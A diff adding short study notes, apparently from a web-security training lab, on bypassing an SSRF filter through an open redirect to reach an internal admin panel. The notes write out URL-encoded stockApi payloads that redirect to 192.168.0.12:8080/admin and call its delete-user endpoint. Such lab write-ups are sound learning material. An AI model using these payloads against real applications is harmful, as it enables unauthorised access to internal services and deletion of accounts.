@@ -1,0 +1,26 @@
+Bypassing SSRF filters via open redirection
+
+Goal: change the stock check url to access the admin interface at http://192.168.0.12:8080/admin and delete the user carlos
+
+you can construct a URL that satisfies the filter and results in a redirected request to the desired back-end target.
+
+For example, suppose the application contains an open redirection vulnerability in which the following URL:
+
+/product/nextProduct?currentProductId=6&path=http://evil-user.net
+
+We see this when clicking on the "next" button
+GET /product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/1.1
+
+Openredirect is where the application wil redirect you to an arbitrary url
+You can use this to exploit the ssrf vuln
+
+To do that- instead of /product/stock/check/productid
+
+you can add the openredirect path that we had.... copy it and paste it under stockApi
+stockApi=/product/nextProduct?currentProductId=1&path=http://<ip>admin
+
+URL Encode:
+/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin
+
+Delete user:
+/product/nextProduct%3fcurrentProductId%3d2%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete?username=carlos
